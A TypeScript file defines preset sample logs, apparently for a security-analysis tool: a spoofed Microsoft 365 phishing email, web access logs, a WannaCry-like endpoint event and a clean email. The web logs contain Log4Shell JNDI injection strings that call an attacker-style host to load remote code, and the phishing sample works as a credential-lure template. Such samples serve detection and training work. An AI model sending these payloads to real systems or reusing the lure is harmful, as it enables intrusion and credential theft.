import { PresetLog } from "./types";

export const PRESET_LOGS: PresetLog[] = [
  {
    id: "phishing-365",
    title: "Phishing Email (Microsoft 365 Spoof)",
    description: "Suspicious login alert targeting employees with malicious URLs, attacker server IP, and unsafe attachments.",
    icon: "MailWarning",
    text: `From: "IT Support Desk" <admin@microsoft365-securelogin-auth.com>
To: "Finance Department" <finance@victim-corp.com>
Subject: ACTION REQUIRED: Critical security update for login credentials

Dear Employee,

Our security scanners detected unusual sign-in activity originating from an unknown device in Russia (IP: 185.195.233.15). To lock your password and update your multifactor credentials, you must click the link below within 24 hours:

Link: http://microsoft365-securelogin-auth.com/login/verify.php?token=4ac9e2

We have also attached your localized network connection checklist (invoice-summary_99812.exe). Please run this check to sync your systems.
Attachment MD5: e11121d5c2e5b7b998facae333a921d7

Best regards,
Enterprise Tech Support`
  },
  {
    id: "web-server-exploit",
    title: "Web Server Attack Logs (CVE-2021-44228)",
    description: "Syslog traces of automated vulnerability scanning, remote code execution attempts, and malicious IP beacons.",
    icon: "ShieldAlert",
    text: `10.0.12.155 - - [15/Jun/2026:08:12:33 -0700] "GET / HTTP/1.1" 200 4502 "http://google.com" "Mozilla/5.0"
193.56.28.14 - - [15/Jun/2026:08:12:35 -0700] "GET /login HTTP/1.1" 404 204 "-" "jndi:ldap://hack-your-dns.ddns.net:1389/Exploit"
193.56.28.14 - - [15/Jun/2026:08:12:37 -0700] "POST /api/upload HTTP/1.1" 500 123 "-" "\${jndi:dns://hack-your-dns.ddns.net/cve-2021-44228-check}"
193.56.28.14 - - [15/Jun/2026:08:12:39 -0700] "GET /favicon.ico HTTP/1.1" 200 1421 "-" "MalwareHunterBot"
10.0.12.155 - - [15/Jun/2026:08:14:10 -0700] "POST /api/session HTTP/1.1" 244 5502 "https://victim-corp.com/" "Mozilla/5.0"
WARNING: Security alert for CVE-2021-44228 remote execution triggered on system pool. Downloaded malicious payloads from domain hack-your-dns.ddns.net. MD5 of payload binary: 5d41402abc4b2a76b9719d911017c592.`
  },
  {
    id: "wannacry-forensics",
    title: "Endpoint Malware Event (WannaCry-like)",
    description: "Forensic event logs summarizing key process start events, killswitch domains, and WannaCry file hashes.",
    icon: "Binary",
    text: `[SYSTEM EVENT JOURNAL - ENDPOINT SEC-001]
Time: 2026-06-15T09:12:33.456Z
Event ID: 4688 (Process Creation)
New Process Name: C:\\ProgramData\\tasksche.exe
Process Command Line: C:\\ProgramData\\tasksche.exe /i
SHA-256 Hash: 247c7e5a171d5356731a124022fe32441a124022fe32441a124022fe32441a12
Creator Process ID: 0x4d2
Parent Process: cmd.exe

Alert: Outbound network socket opened to Tor Relays on ports 9001 and 443.
Host accessed: wxp4342asb42a.onion
System checked killswitch domain to verify status: iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
Ransom note dropped to Desktop: @Please_Read_Me@.txt`
  },
  {
    id: "clean-email",
    title: "Clean Corporate Communication",
    description: "Standard daily business conversation with system instructions, free of malicious links or activities.",
    icon: "CheckCircle",
    text: `From: "Operations Coordinator" <sarah.jenkins@victim-corp.com>
To: "Project Team" <team-active@victim-corp.com>
Subject: Agenda for Tuesday's Architecture Alignment Sync

Hi everyone,

Just a friendly reminder that we are having our weekly sync tomorrow at 10 AM EST.
We'll be discussing the migration to Vite 6, using Tailwind CSS, and updating our server scripts to make deployment a breeze.

Please make sure to review the draft document (vite-migration-v2.pdf) stored on the shared drive before the call.

See you all tomorrow!
Sarah`
  }
];
